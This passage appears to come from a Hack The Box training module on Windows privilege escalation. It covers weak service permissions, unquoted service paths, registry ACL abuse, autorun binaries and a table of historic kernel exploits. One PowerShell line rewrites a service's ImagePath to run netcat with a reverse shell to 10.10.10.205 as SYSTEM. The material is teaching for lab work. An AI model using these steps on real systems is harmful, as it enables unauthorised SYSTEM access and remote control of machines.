<p>Another notable example is the Windows <a href="https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works">Update Orchestrator Service (UsoSvc)</a>, which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful <code>NT AUTHORITY\SYSTEM</code> account. Before installing the security patch relating to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322">CVE-2019-1322</a>, it was possible to elevate privileges from a service account to <code>SYSTEM</code>. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.</p>
<hr>
<h3 id="weak-service-permissions-cleanup">Weak Service Permissions - Cleanup</h3>
<p>We can clean up after ourselves and ensure that the service is working correctly by stopping it and resetting the binary path back to the original service executable.</p>
<p><strong>Reverting the Binary Path</strong></p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; sc config WindScribeService binpath="c:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\W</span>indscribe<span class="hljs-symbol">\W</span>indscribeService.exe"

[SC] ChangeServiceConfig SUCCESS
</code></pre>
<p><strong>Starting the Service Again</strong></p>
<p>If all goes to plan, we can start the service again without an issue.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc start WindScribeService

<span class="hljs-attribute">SERVICE_NAME</span>: WindScribeService
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">2</span>  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">PID                </span>: <span class="hljs-number">1716</span>
        <span class="hljs-attribute">FLAGS              </span>:
</code></pre>
<p><strong>Verifying Service is Running</strong></p>
<p>Querying the service will show it running again as intended.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc query WindScribeService

<span class="hljs-attribute">SERVICE_NAME</span>: WindScribeService
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">10</span>  WIN32_OWN_PROCESS
        <span class="hljs-attribute">STATE              </span>: <span class="hljs-number">4</span>  Running
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        <span class="hljs-attribute">WIN32_EXIT_CODE    </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">SERVICE_EXIT_CODE  </span>: <span class="hljs-number">0</span>  (<span class="hljs-number">0</span>x0)
        <span class="hljs-attribute">CHECKPOINT         </span>: <span class="hljs-number">0</span>x0
        <span class="hljs-attribute">WAIT_HINT          </span>: <span class="hljs-number">0</span>x0
</code></pre>
<hr>
<h3 id="unquoted-service-path">Unquoted Service Path</h3>
<p>When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.</p>
<p><strong>Service Binary Path</strong></p>
<p>Weak Permissions</p>
<pre><code class="lang-shell-session">C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\S</span>ystem Explorer<span class="hljs-symbol">\s</span>ervice<span class="hljs-symbol">\S</span>ystemExplorerService64.exe
</code></pre>
<p>Windows will decide the execution method of a program based on its file extension, so it&#39;s not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:</p>
<ul>
<li><code>C:\Program</code></li>
<li><code>C:\Program Files</code></li>
<li><code>C:\Program Files (x86)\System</code></li>
<li><code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64</code></li>
</ul>
<p><strong>Querying Service</strong></p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session"><span class="hljs-attribute">C</span>:\htb&gt; sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

<span class="hljs-attribute">SERVICE_NAME</span>: SystemExplorerHelpService
        <span class="hljs-attribute">TYPE               </span>: <span class="hljs-number">20</span>  WIN32_SHARE_PROCESS
        <span class="hljs-attribute">START_TYPE         </span>: <span class="hljs-number">2</span>   AUTO_START
        <span class="hljs-attribute">ERROR_CONTROL      </span>: <span class="hljs-number">0</span>   IGNORE
        <span class="hljs-attribute">BINARY_PATH_NAME   </span>: <span class="hljs-attribute">C</span>:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        <span class="hljs-attribute">LOAD_ORDER_GROUP   </span>:
        <span class="hljs-attribute">TAG                </span>: <span class="hljs-number">0</span>
        <span class="hljs-attribute">DISPLAY_NAME       </span>: System Explorer Service
        <span class="hljs-attribute">DEPENDENCIES       </span>:
        <span class="hljs-attribute">SERVICE_START_NAME </span>: LocalSystem
</code></pre>
<p>If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, <code>NT AUTHORITY\SYSTEM</code>.</p>
<ul>
<li><code>C:\Program.exe\</code></li>
<li><code>C:\Program Files (x86)\System.exe</code></li>
</ul>
<p>However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn&#39;t be able to restart the service and would be reliant on a system restart to escalate privileges. Although it&#39;s not uncommon to find applications with unquoted service paths, it isn&#39;t often exploitable.</p>
<p><strong>Searching for Unquoted Service Paths</strong></p>
<p>We can identify unquoted service binary paths using the command below.</p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\\</span>" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\G</span>VFS<span class="hljs-symbol">\G</span>VFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\S</span>ystem Explorer<span class="hljs-symbol">\s</span>ervice<span class="hljs-symbol">\S</span>ystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\W</span>indscribe<span class="hljs-symbol">\W</span>indscribeService.exe                                  Auto
</code></pre>
<hr>
<h3 id="permissive-registry-acls">Permissive Registry ACLs</h3>
<p>It is also worth searching for weak service ACLs in the Windows Registry. We can do this using <code>accesschk</code>.</p>
<p><strong>Checking for Weak Service ACLs in Registry</strong></p>
<p>Weak Permissions</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; accesschk.exe /accepteula "mrb3n" -kvuqsw hklm<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\s</span>ervices

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

RW HKLM<span class="hljs-symbol">\S</span>ystem<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\s</span>ervices<span class="hljs-symbol">\M</span>odelManagerService
        KEY_ALL_ACCESS

&lt;SNIP&gt;
</code></pre>
<p><strong>Changing ImagePath with PowerShell</strong></p>
<p>We can abuse this using the PowerShell cmdlet <code>Set-ItemProperty</code> to change the <code>ImagePath</code> value, using a command such as:</p>
<p>Weak Permissions</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Set-ItemProperty -Path HKLM:<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>urrentControlSet<span class="hljs-symbol">\S</span>ervices<span class="hljs-symbol">\M</span>odelManagerService -Name "ImagePath" -Value "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\j</span>ohn<span class="hljs-symbol">\D</span>ownloads<span class="hljs-symbol">\n</span>c.exe -e cmd.exe 10.10.10.205 443"
</code></pre>
<hr>
<h3 id="modifiable-registry-autorun-binary">Modifiable Registry Autorun Binary</h3>
<p><strong>Check Startup Programs</strong></p>
<p>We can use WMIC to see what programs run at system startup. Suppose we have write permissions to the registry for a given binary or can overwrite a binary listed. In that case, we may be able to escalate privileges to another user the next time that the user logs in.</p>
<p>Weak Permissions</p>
<pre><code class="lang-powershell-session">PS C:<span class="hljs-symbol">\h</span>tb&gt; Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

Name     : OneDrive
command  : "C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\m</span>rb3n<span class="hljs-symbol">\A</span>ppData<span class="hljs-symbol">\L</span>ocal<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\O</span>neDrive<span class="hljs-symbol">\O</span>neDrive.exe" /background
Location : HKU<span class="hljs-symbol">\S</span>-1-5-21-2374636737-2633833024-1808968233-1001<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
User     : WINLPE-WS01<span class="hljs-symbol">\m</span>rb3n

Name     : Windscribe
command  : "C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\W</span>indscribe<span class="hljs-symbol">\W</span>indscribe.exe" -os_restart
Location : HKU<span class="hljs-symbol">\S</span>-1-5-21-2374636737-2633833024-1808968233-1001<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
User     : WINLPE-WS01<span class="hljs-symbol">\m</span>rb3n

Name     : SecurityHealth
command  : <span class="hljs-variable">%windir%</span><span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\S</span>ecurityHealthSystray.exe
Location : HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
User     : Public

Name     : VMware User Process
command  : "C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\V</span>Mware<span class="hljs-symbol">\V</span>Mware Tools<span class="hljs-symbol">\v</span>mtoolsd.exe" -n vmusr
Location : HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
User     : Public

Name     : VMware VM3DService Process
command  : "C:<span class="hljs-symbol">\W</span>INDOWS<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\v</span>m3dservice.exe" -u
Location : HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un
User     : Public
</code></pre>
<p>This <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries">post</a> and <a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&amp;seqNum=2">this site</a> detail many potential autorun locations on Windows systems.</p>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<hr>
<p>It&#39;s a big challenge to ensure that all user desktops and servers are updated, and 100% compliance for all computers with security patches is likely not an achievable goal. Assuming a computer has been targeted for installation of updates, for example, using SCCM (Microsoft System Center Configuration Manager) or WSUS (Windows Server Update Services), there are still many reasons they could fail to install. Over the years, there have been many kernel exploits that affect the Windows operating system from Windows 2000/XP up to Windows 10/Server 2016/2019. Below can be found a detailed table of known remote code execution/local privilege escalation exploits for Windows operating systems, broken down by service pack level, from Windows XP onward to Server 2016.</p>
<table>
<thead>
<tr>
<th>Base OS</th>
<th>XP</th>
<th></th>
<th></th>
<th></th>
<th>2003</th>
<th></th>
<th></th>
<th>Vista</th>
<th></th>
<th></th>
<th>2008</th>
<th></th>
<th>7</th>
<th></th>
<th>2008R2</th>
<th></th>
<th>8</th>
<th>8.1</th>
<th>2012</th>
<th>2012R2</th>
<th>10</th>
<th>2016</th>
</tr>
</thead>
<tbody>
<tr>
<td>Service Pack</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP3</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP2</td>
<td>SP0</td>
<td>SP2</td>
<td>SP0</td>
<td>SP1</td>
<td>SP0</td>
<td>SP1</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS03-026</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS05-039</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-025</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-067</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS08-068</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-012</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS09-050</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-015</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-059</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS10-092</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-011</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-046</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-062</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS11-080</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-005</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-053</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS13-081</td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-002</td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-040</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-058</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-062</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-068</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS14-070</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-001</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-051</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-061</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-076</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-078</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS15-097</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>MS16-016</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-032</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td></td>
</tr>
<tr>
<td>MS16-135</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>MS17-010</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>CVE-2017-0213: COM Aggregate Marshaler</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
<tr>
<td>Hot Potato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td></td>
</tr>
<tr>
<td>SmashedPotato</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
<td>•</td>
</tr>
</tbody>
</table>
<p>Note: This table is not 100% complete, and does not go past 2017. As of today, there are more known vulnerabilities for the newer operating system versions and even Server 2019.</p>
<p>This <a href="https://msrc.microsoft.com/update-guide/vulnerability">site</a> is handy for searching out detailed information about Microsoft security vulnerabilities. This database has 4,733 security vulnerabilities entered at the time of writing, showing the massive attack surface that a Windows environment presents.</p>
<p>As we can see from this table, there are many exploits that work for Windows XP up through Server 2012R2. As we get to Windows 10 and Server 2016, there are fewer known exploits. This is partly due to changes to the operating system over time, including security improvements and deprecation of older versions of protocols such as SMB. One important thing to note from this table is that when new vulnerabilities are discovered or exploits released (such as MS17-010), these usually trickle down and affect prior operating system versions. This is why it is vital to stay on top of patching or upgrading, retiring, or segregating off Windows systems that have reached end of life. We will explore this in more depth later on in this module.</p>
<p>It is important to note that while some of the examples above <code>are</code> remote code execution vulnerabilities, we can just as easily use them to escalate privileges. One example is if we gain access to a system and notice a port such as 445 (SMB service) not accessible from the outside, we may be able to privilege escalate if it is vulnerable to something such as EternalBlue (MS17-010). In this case, we could either port forward the port in question to be accessible from our attack host or run the exploit in question locally to escalate privileges.</p>
<hr>
<h3 id="notable-vulnerabilities">Notable Vulnerabilities</h3>
<p>Over the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. One example of the latter would be landing on a box that does not allow access to port 445 from the outside, performing port forward to access this port from our attack box, and leveraging a remote code execution flaw against the SMB service to escalate privileges. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.</p>
<p><code>MS08-067</code> - This was a remote code execution vulnerability in the &quot;Server&quot; service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a &quot;legacy&quot; vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box <a href="https://0xdf.gitlab.io/2019/02/21/htb-legacy.html">Legacy</a> on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.</p>
<p><code>MS17-010</code> - Also known as <a href="https://en.wikipedia.org/wiki/EternalBlue">EternalBlue</a> is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the <a href="https://en.wikipedia.org/wiki/The\_Shadow\_Brokers">Shadow Brokers</a> leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the <a href="https://0xdf.gitlab.io/2021/05/11/htb-blue.html">Blue</a> box on Hack The Box, again from the remote standpoint.</p>
